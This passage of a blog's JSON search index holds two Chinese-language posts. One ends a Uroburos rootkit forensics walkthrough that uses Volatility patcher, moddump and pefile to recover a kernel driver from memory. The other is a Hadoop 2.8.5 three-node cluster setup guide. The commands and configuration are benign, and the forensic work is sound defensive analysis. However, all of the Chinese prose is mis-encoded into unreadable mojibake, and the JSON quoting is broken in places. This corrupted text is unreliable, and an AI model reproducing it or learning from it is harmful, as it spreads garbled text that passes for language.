volatilityæœ‰ä¸ªpatcheræ’ä»¶å¯ä»¥å¤„ç†è¿™ç§æƒ…å†µã€‚æˆ‘ä»¬é¦–å…ˆè¦å†™ä¸€ä¸ªxmlæ–‡ä»¶æ¥ä¿®è¡¥PEå¤´ï¼š è¿™å°†åœ¨æ¯ä¸ªé¡µé¢è¾¹ç•Œçš„èµ·å§‹ä½ç½®æœç´¢æˆ‘ä»¬åœ¨å†…å­˜ä¸­æ‰¾åˆ°çš„é©±åŠ¨ç¨‹åºçš„å¼€å§‹å­—èŠ‚ï¼Œå¹¶ä¸ºç»“æ„æ­£ç¡®çš„PEå¤´æ’å…¥é­”æœ¯å­—ã€‚ $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 patcher -w -x patchdriver.xml Volatility Foundation Volatility Framework 2.3.1 Write support requested. Please type \"Yes, I want to enable write support\" below precisely (case-sensitive): Yes, I want to enable write support Calibrating for speed: Reading patch locations per page Patching Fix Driver MZ Header at page 9634000 çœ‹èµ·æ¥æ²¡æœ‰é—®é¢˜ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹ï¼š \u003e\u003e\u003e db(0x89634000, 0x100) 0x89634000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x89634010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x89634020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x89634030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x89634040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x89634050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x89634060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x89634070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 0x89634080 b2 4e 55 e7 f6 2f 3b b4 f6 2f 3b b4 f6 2f 3b b4 .NU../;../;../;. 0x89634090 f6 2f 3a b4 26 2f 3b b4 af 0c 28 b4 ff 2f 3b b4 ./:.\u0026/;...(../;. 0x896340a0 d1 e9 46 b4 f4 2f 3b b4 d1 e9 4a b4 74 2f 3b b4 ..F../;...J.t/;. 0x896340b0 d1 e9 41 b4 f7 2f 3b b4 d1 e9 43 b4 f7 2f 3b b4 ..A../;...C../;. 0x896340c0 52 69 63 68 f6 2f 3b b4 00 00 00 00 00 00 00 00 Rich./;......... 0x896340d0 50 45 00 00 4c 01 05 00 e7 eb 14 51 00 00 00 00 PE..L......Q.... 0x896340e0 00 00 00 00 e0 00 02 21 0b 01 08 00 00 00 07 00 .......!........ 0x896340f0 00 72 02 00 00 00 00 00 40 d1 00 00 00 10 00 00 .r......@....... OK,è¿™æ¬¡å°±æ²¡æœ‰é—®é¢˜äº†ã€‚ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:2","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"è½¬å‚¨é©±åŠ¨ç¨‹åº ç°åœ¨PEç»“æ„å·²ç»ä¿®å¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä»å†…å­˜ä¸­å°†é©±åŠ¨ç¨‹åºè½¬å‚¨å‡ºæ¥ï¼š $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 moddump -b 0x89634000 -D . Volatility Foundation Volatility Framework 2.3.1 Module Base Module Name Result ----------- -------------------- ------ 0x089634000 UNKNOWN OK: driver.89634000.sys è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä½¿ç”¨moddumpæ’ä»¶è¿›è¡Œå†…å­˜è½¬å‚¨æ—¶ï¼Œå¹¶æ²¡æœ‰ä¿®å¤ImageBaseï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è¿›è¡Œæ‰‹åŠ¨ä¿®å¤ã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨pefileåº“ï¼š \u003e\u003e\u003e import pefile \u003e\u003e\u003e pe = pefile.PE('driver.89634000.sys') \u003e\u003e\u003e hex(pe.OPTIONAL_HEADER.ImageBase) '0x10000' \u003e\u003e\u003e pe.OPTIONAL_HEADER.ImageBase = 0x89634000 \u003e\u003e\u003e pe.write(filename='driver.89634000_mod.sys') OKï¼Œåˆ°æ­¤ä¸ºæ­¢ï¼Œè½¬å‚¨å‡ºæ¥çš„é©±åŠ¨ç¨‹åºåº”è¯¥å°±æ²¡æœ‰é—®é¢˜äº†ï¼Œä½¿ç”¨IDAæ‰“å¼€çœ‹ä¸€ä¸‹ï¼š æ²¡æœ‰é—®é¢˜ï¼Œç°åœ¨å°±å¯ä»¥ä½¿ç”¨IDAè¿›è¡Œæ·±å…¥çš„é™æ€åˆ†æäº†ã€‚ ","date":"2019-10-24","objectID":"/2019/10/rootkit/:2:3","tags":["rootkit"],"title":"Uroburos Rootkitåˆ†æ","uri":"/2019/10/rootkit/"},{"categories":["Vuln"],"content":"Hadoop--åˆå­¦åˆ°æ¼æ´","date":"2019-10-19","objectID":"/2019/10/hadoop6/","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"Hadoopâ€“åˆå­¦åˆ°æ¼æ´(å…­)â€“åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:0:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"æœåŠ¡å™¨åŠŸèƒ½è§„åˆ’ zy1 zy2 zy3 NameNode ResourceManage DataNode DataNode DataNode NodeManager NodeManager NodeManager HistoryServer SecondaryNameNode ipï¼š10.251.0.144 ipï¼š10.251.0.150 ipï¼š10.251.0.151 ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:1:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"ä¸€ã€è§£å‹Hadoopç›®å½• wget http://mirrors.tuna.tsinghua.edu.cn/apache/hadoop/common/hadoop-2.8.5/hadoop-2.8.5.tar.gz tar -zxvf hadoop-2.8.5.tar.gz -C /opt/bigdata mv hadoop-2.8.5 hadoop åœ¨ä¼ªåˆ†å¸ƒå¼å®‰è£…æ—¶ï¼Œå·²ç»é…ç½®äº†hadoopçš„ç¯å¢ƒå˜é‡ï¼Œæ— éœ€å†é‡å¤é…ç½®äº†ã€‚éªŒè¯ï¼š echo $HADOOP_HOME ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:2:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"äºŒã€é…ç½® hadoop-env.shã€mapred-env.sh yarn-env.sh JAVA_HOMEå‚æ•° æ¯”å¦‚ä¿®æ”¹hadoop-env.shï¼š vim ${HADOOP_HOME}/etc/hadoop/hadoop-env.sh ä¿®æ”¹JAVA_HOMEå‚æ•°ä¸ºï¼š export JAVA_HOME=/usr/lib/jvm/java ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:3:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"ä¸‰ã€å„ä¸»è¦é…ç½®æ–‡ä»¶é…ç½® ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"1. é…ç½®core-site.xml vim ${HADOOP_HOME}/etc/hadoop/core-site.xml æ·»åŠ å†…å®¹å¦‚ä¸‹ï¼š \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003efs.defaultFS\u003c/name\u003e \u003cvalue\u003ehdfs://zy1:9000\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003ehadoop.tmp.dir\u003c/name\u003e \u003cvalue\u003e/opt/bigdata/data/hadoop\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.name.dir\u003c/name\u003e \u003cvalue\u003efile://${hadoop.tmp.dir}/dfs/name\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.data.dir\u003c/name\u003e \u003cvalue\u003efile://${hadoop.tmp.dir}/dfs/data\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e fs.defaultFSä¸ºNameNodeçš„åœ°å€ã€‚ hadoop.tmp.dirï¼šä¸ºhadoopä¸´æ—¶ç›®å½•çš„åœ°å€ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒNameNodeå’ŒDataNodeçš„æ•°æ®æ–‡ä»¶éƒ½ä¼šå­˜åœ¨è¿™ä¸ªç›®å½•ä¸‹çš„å¯¹åº”å­ç›®å½•ä¸‹ï¼ˆä½†æ˜¯ä¸Šé¢æˆ‘ä»¬é€šè¿‡dfs.datanode.data.dirï¼Œå’Œdfs.namenode.data.diræŒ‡å®šäº†ï¼‰ã€‚åº”è¯¥ä¿è¯æ­¤ç›®å½•æ˜¯å­˜åœ¨çš„ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå…ˆåˆ›å»ºï¼› dfs.namenode.name.dirï¼šæŒ‡å®šç›®å½•æ¥ä¾›namenodeå­˜å‚¨æ°¸ä¹…æ€§çš„æ–‡ä»¶ç³»ç»Ÿå…ƒæ•°æ®ï¼ˆå¦‚æœæŒ‡å®šå¤šä¸ªè·¯å¾„ï¼Œä½¿ç”¨\",â€œéš”å¼€ï¼‰ã€‚è¿™äº›å…ƒæ•°æ®æ–‡ä»¶ä¼šåŒæ—¶å¤‡ä»½åœ¨æ‰€æœ‰æŒ‡å®šçš„ç›®å½•ä¸Šï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œé€šè¿‡é…ç½®dfs.namenode.data.dirå¯ä»¥å°†namenodeå…ƒæ•°æ®å†™åˆ°ä¸€ä¸¤ä¸ªæœ¬åœ°ç£ç›˜å’Œä¸€ä¸ªè¿œç¨‹ç£ç›˜ï¼ˆä¾‹å¦‚NFSæŒ‚è½½ç›®å½•ï¼‰ä¹‹ä¸­ã€‚è¿™æ ·çš„è¯ï¼Œå³ä½¿æœ¬åœ°ç£ç›˜å‘ç”Ÿæ•…éšœï¼Œç”šè‡³æ•´ä¸ªnamenodeå‘ç”Ÿæ•…éšœï¼Œéƒ½å¯ä»¥æ¢å¤æ•°æ®æ–‡ä»¶å¹¶é‡æ–°æ„æˆæ–°çš„namenodeï¼ˆè¾…åŠ©namenodeåªæ˜¯å®šæœŸä¿å­˜namenodeçš„æ£€æŸ¥ç‚¹ï¼Œä¸ç»´æŠ¤namenodeçš„æœ€æ–°å¤‡ä»½ï¼‰ï¼› dfs.datanode.data.dirï¼šå¯ä»¥è®¾å®šdatanodeå­˜å‚¨æ•°æ®å—çš„ç›®å½•åˆ—è¡¨ï¼Œä¸Šé¢æåˆ°dfs.namenode.name.diræè¿°ä¸€ç³»åˆ—ç›®å½•ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†æ”¯æŒnamenodeè¿›è¡Œå†—ä½™å¤‡ä»½ã€‚è™½ç„¶dfs.datanode.data.dirä¹Ÿæè¿°äº†ä¸€ç³»åˆ—ç›®å½•ï¼Œä½†æ˜¯å…¶ç›®çš„æ˜¯ä½¿datanodeå¾ªç¯çš„åœ¨å„ä¸ªç›®å½•ä¸­å†™æ•°æ®ã€‚å› æ­¤ï¼Œä¸ºäº†æé«˜æ€§èƒ½ï¼Œæœ€å¥½åˆ†åˆ«ä¸ºå„ä¸ªæœ¬åœ°ç£ç›˜æŒ‡å®šä¸€ä¸ªå­˜å‚¨ç›®å½•ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæ•°æ®å—è·¨ç£ç›˜åˆ†å¸ƒï¼Œé’ˆå¯¹ä¸åŒçš„æ•°æ®å—çš„è¯»æ“ä½œå¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œä»è€Œæé«˜è¯»å–é€Ÿåº¦ã€‚ mkdir /opt/bigdata/data/hadoop ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:1","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"2. é…ç½®hdfs-site.xml vim ${HADOOP_HOME}/etc/hadoop/hdfs-site.xml æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.secondary.http-address\u003c/name\u003e \u003cvalue\u003ezy3:50090\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.replication\u003c/name\u003e \u003cvalue\u003e2\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.client.use.datanode.hostname\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.use.datanode.hostname\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e dfs.namenode.secondary.http-addressï¼šæ˜¯æŒ‡å®šsecondaryNameNodeçš„httpè®¿é—®åœ°å€å’Œç«¯å£å·ï¼Œå› ä¸ºåœ¨è§„åˆ’ä¸­ï¼Œæˆ‘ä»¬å°†zy3è§„åˆ’ä¸ºSecondaryNameNodeæœåŠ¡å™¨ã€‚æ‰€ä»¥è¿™é‡Œè®¾ç½®ä¸ºï¼šzy3:50090ã€‚ dfs.replicationé…ç½®çš„æ˜¯HDFSå­˜å‚¨æ—¶çš„å¤‡ä»½æ•°é‡ï¼Œè¿™é‡Œè®¾ç½®ä¸º2ï¼› fs.client.use.datanode.hostnameï¼šæ˜¯å¦å®¢æˆ·ç«¯åº”è¯¥ä½¿ç”¨DNçš„HostNameï¼Œåœ¨è¿æ¥DNæ—¶ï¼Œé»˜è®¤æ˜¯ä½¿ç”¨IPï¼›ï¼ˆå¿…é¡»è®¾ç½®ä¸ºtrueï¼‰ dfs.datanode.use.datanode.hostnameï¼šæ˜¯å¦DNåº”è¯¥ä½¿ç”¨HostNameè¿æ¥å…¶å®ƒDNï¼Œåœ¨æ•°æ®ä¼ è¾“æ—¶ã€‚é»˜è®¤æ˜¯æ˜¯IPã€‚ï¼ˆå¿…é¡»è®¾ç½®ä¸ºtrueï¼‰ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:2","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"3. é…ç½®mastersã€slaves cd hadoop vim etc/hadoop/masters vim etc/hadoop/slaves mastersä¿®æ”¹ä¸ºï¼šzy1 slaversï¼šzy2 â€‹ zy3 mastersæ–‡ä»¶æ˜¯æŒ‡å®šHDFSçš„ä¸»èŠ‚ç‚¹ï¼Œzy1ç‰¹æœ‰ï¼›slavesæ–‡ä»¶æ˜¯æŒ‡å®šHDFSä¸Šæœ‰å“ªäº›DataNodeèŠ‚ç‚¹ã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:3","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"4. é…ç½®mapred-site.xml å¤åˆ¶mapred-site.xml.templateé…ç½®æ¨¡æ¿æ–‡ä»¶ç”Ÿæˆmapred-site.xmlï¼š cp etc/hadoop/mapred-site.xml.template etc/hadoop/mapred-site.xml æ·»åŠ é…ç½®ï¼š vim etc/hadoop/mapred-site.xml ä¿®æ”¹å†…å®¹å¦‚ä¸‹ï¼š \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003emapreduce.framework.name\u003c/name\u003e \u003cvalue\u003eyarn\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003emapreduce.jobhistory.address\u003c/name\u003e \u003cvalue\u003ezy1:10020\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003emapreduce.jobhistory.webapp.address\u003c/name\u003e \u003cvalue\u003ezy1:19888\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e mapreduce.framework.nameè®¾ç½®mapreduceä»»åŠ¡è¿è¡Œåœ¨yarnä¸Šï¼› mapreduce.jobhistory.addressæ˜¯è®¾ç½®mapreduceçš„å†å²æœåŠ¡å™¨å®‰è£…åœ¨zy1æœºå™¨ä¸Šï¼› mapreduce.jobhistory.webapp.addressæ˜¯è®¾ç½®å†å²æœåŠ¡å™¨çš„webé¡µé¢åœ°å€å’Œç«¯å£å·ã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:4","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"5. é…ç½®yarn-site.xml vim etc/hadoop/yarn-site.xml æ·»åŠ å†…å®¹å¦‚ä¸‹ï¼š \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003eyarn.nodemanager.aux-services\u003c/name\u003e \u003cvalue\u003emapreduce_shuffle\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.resourcemanager.hostname\u003c/name\u003e \u003cvalue\u003ezy2\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.log-aggregation-enable\u003c/name\u003e \u003cvalue\u003etrue\u003c/value\u003e \u003c/property\u003e \u003cproperty\u003e \u003cname\u003eyarn.log-aggregation.retain-seconds\u003c/name\u003e \u003cvalue\u003e106800\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e yarn.nodemanager.aux-servicesé…ç½®äº†yarnçš„é»˜è®¤æ··æ´—æ–¹å¼ï¼Œé€‰æ‹©ä¸ºmapreduceçš„é»˜è®¤æ··æ´—ç®—æ³•ï¼› yarn.resourcemanager.hostnameæŒ‡å®šäº†Resourcemanagerè¿è¡Œåœ¨zy2èŠ‚ç‚¹ä¸Šï¼› yarn.log-aggregation-enableæ˜¯é…ç½®æ˜¯å¦å¯ç”¨æ—¥å¿—èšé›†åŠŸèƒ½ï¼› yarn.log-aggregation.retain-secondsæ˜¯é…ç½®èšé›†çš„æ—¥å¿—åœ¨HDFSä¸Šæœ€å¤šä¿å­˜å¤šé•¿æ—¶é—´ï¼› ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:4:5","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"å››ã€è®¾ç½®SSHæ— å¯†ç ç™»å½•åŠæ–‡ä»¶åˆ†å‘ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:5:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"1. SSHæ— å¯†ç ç™»å½•é…ç½® Hadoopé›†ç¾¤ä¸­çš„å„ä¸ªæœºå™¨é—´ä¼šç›¸äº’åœ°é€šè¿‡SSHè®¿é—®ï¼Œæ‰€ä»¥è¦é…ç½®å„ä¸ªæœºå™¨é—´çš„SSHä¸ºæ— å¯†ç ç™»å½•çš„ã€‚ åœ¨zy1ä¸Šç”Ÿæˆå…¬é’¥ï¼š ssh-keygen -t rsa åœ¨å½“å‰ç”¨æˆ·çš„Homeç›®å½•ä¸‹çš„.sshç›®å½•ä¸­ä¼šç”Ÿæˆå…¬é’¥æ–‡ä»¶ï¼ˆid_rsa.pubï¼‰å’Œç§é’¥æ–‡ä»¶ï¼ˆid_rsaï¼‰ã€‚ åˆ†å‘å…¬é’¥ï¼š ssh-copy-id zy1 ssh-copy-id zy2 ssh-copy-id zy3 è®¾ç½®zy2ã€zy3åˆ°å…¶ä»–æœºå™¨çš„æ— å¯†é’¥ç™»å½•ï¼šåŒæ ·çš„åœ¨zy2ã€zy3ä¸Šç”Ÿæˆå…¬é’¥å’Œç§é’¥åï¼Œå°†å…¬é’¥åˆ†å‘åˆ°ä¸‰å°æœºå™¨ä¸Šã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:5:1","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"2. åˆ†å‘Hadoopæ–‡ä»¶ é€šè¿‡Scpåˆ†å‘ï¼š cd /opt/bigdata scp -r /opt/bigdata/hadoop/ zy2:/opt/bigdata scp -r /opt/bigdata/hadoop/ zy3:/opt/bigdata åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸‹æ‰§è¡Œï¼š mkdir /opt/bigdata/data/hadoop ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:5:2","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"äº”ã€æ ¼å¼åŒ–å’Œå¯åŠ¨è¿è¡Œ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"1. æ ¼å¼NameNode åœ¨ä½¿ç”¨hadoopä¹‹å‰ï¼Œå…¨æ–°çš„HDFSå®‰è£…éœ€è¦è¿›è¡Œæ ¼å¼åŒ–ã€‚é€šè¿‡åˆ›å»ºå­˜å‚¨ç›®å½•å’Œåˆå§‹åŒ–ç‰ˆæœ¬çš„namenodeæŒä¹…æ•°æ®ç»“æ„ï¼Œæ ¼å¼åŒ–å°†åˆ›å»ºä¸€ä¸ªç©ºçš„æ–‡ä»¶ç³»ç»Ÿã€‚ åœ¨NameNodeæœºå™¨ä¸Š(èŠ‚ç‚¹zy1)æ‰§è¡Œæ ¼å¼åŒ–ï¼š hdfs namenode -format æ³¨æ„ï¼šå¦‚æœéœ€è¦é‡æ–°æ ¼å¼åŒ–NameNodeï¼Œéœ€è¦å…ˆå°†åŸæ¥NameNodeå’ŒDataNodeä¸‹çš„æ–‡ä»¶å…¨éƒ¨åˆ é™¤ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼ŒNameNodeå’ŒDataNodeæ‰€åœ¨ç›®å½•æ˜¯åœ¨core-site.xmlä¸­hadoop.tmp.dirã€dfs.namenode.name.dirã€dfs.datanode.data.dirå±æ€§é…ç½®çš„ã€‚ æ¯æ¬¡æ ¼å¼åŒ–ï¼Œé»˜è®¤åˆ›å»ºä¸€ä¸ªé›†ç¾¤IDï¼Œå¹¶å†™å…¥NameNodeçš„VERSIONæ–‡ä»¶ä¸­ï¼ˆVERSIONæ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸ºdfs/name/current ï¼‰ã€‚ æ­¤æ—¶å¹¶æ²¡æœ‰å°†é›†ç¾¤IDå†™å…¥DataNodeçš„VERSIONä¹‹ä¸­ï¼Œç”±äºnamenodeç®¡ç†æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿçš„å…ƒæ•°æ®ï¼Œdatanodeå¯ä»¥åŠ¨æ€åŠ å…¥æˆ–ç¦»å¼€é›†ç¾¤ï¼Œæ‰€ä»¥åˆå§‹çš„æ ¼å¼åŒ–è¿‡ç¨‹ä¸æ¶‰åŠdatanodeã€‚ åªæœ‰åœ¨å¯åŠ¨HDFSæ—¶ï¼Œæ‰ä¼šå°†IDå†™å…¥DataNodeçš„VERSIONä¹‹ä¸­ã€‚å¦‚æœæˆ‘ä»¬é‡æ–°æ ¼å¼åŒ–HDFSï¼Œé‡æ–°æ ¼å¼åŒ–æ—¶ï¼Œé»˜è®¤ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„é›†ç¾¤IDï¼Œå¦‚æœä¸åˆ é™¤åŸæ¥çš„æ•°æ®ç›®å½•ï¼Œä¼šå¯¼è‡´namenodeä¸­çš„VERSIONæ–‡ä»¶ä¸­æ˜¯æ–°çš„é›†ç¾¤ID,è€ŒDataNodeä¸­æ˜¯æ—§çš„é›†ç¾¤IDï¼Œä¸ä¸€è‡´æ—¶ä¼šæŠ¥é”™ã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:1","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"2. å¯åŠ¨HDFS åœ¨zy1èŠ‚ç‚¹è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š start-dfs.sh ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:2","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"3. å¯åŠ¨YARN start-yarn.sh åœ¨zy2ä¸Šå¯åŠ¨ResourceManagerï¼š yarn-daemon.sh start resourcemanager ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:3","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"4. å¯åŠ¨æ—¥å¿—æœåŠ¡å™¨ è§„åˆ’ä¸ºåœ¨zy1æœåŠ¡å™¨ä¸Šè¿è¡ŒMapReduceæ—¥å¿—æœåŠ¡ï¼Œæ‰€ä»¥è¦åœ¨zy1ä¸Šå¯åŠ¨ï¼š mr-jobhistory-daemon.sh start historyserver ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:4","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"5. æŸ¥çœ‹HDFS Webé¡µé¢ hdfsçš„Webå®¢æˆ·ç«¯ç«¯å£å·æ˜¯50070ï¼Œé€šè¿‡http://zy1:50070/å¯ä»¥æŸ¥çœ‹ã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:5","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"6. æŸ¥çœ‹YARN Web é¡µé¢ YARNçš„Webå®¢æˆ·ç«¯ç«¯å£å·æ˜¯8088ï¼Œç”±äºResourceManagerè®¾ç½®åœ¨zy2èŠ‚ç‚¹ä¸Šï¼Œå› æ­¤é€šè¿‡http://zy2:8088/æŸ¥çœ‹å½“å‰æ‰§è¡Œçš„jobã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:6","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"7. hadoopé…ç½®ä¿¡æ¯ Hadoopæ›´å¤šç«¯å£ç›¸å…³çš„é…ç½®å‚è€ƒï¼šhadoopç«¯å£å·é…ç½®ä¿¡æ¯ã€ResourceManagerç›¸å…³é…ç½®å‚æ•°ã€‚ æ›´å¤šHadoopçš„å‚æ•°é…ç½®å¯ä»¥æƒ¨å¼€ï¼šhadoop å‚æ•°é…ç½®ã€‚ ","date":"2019-10-19","objectID":"/2019/10/hadoop6/:6:7","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(å…­)--åˆ†å¸ƒå¼ç¯å¢ƒæ­å»º","uri":"/2019/10/hadoop6/"},{"categories":["Vuln"],"content":"8. å…³é—­hadoop åœ¨å„ä¸ªèŠ‚ç‚¹ä¸‹è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š cd /opt/bigdata/hadoop sbin/stop-all.sh 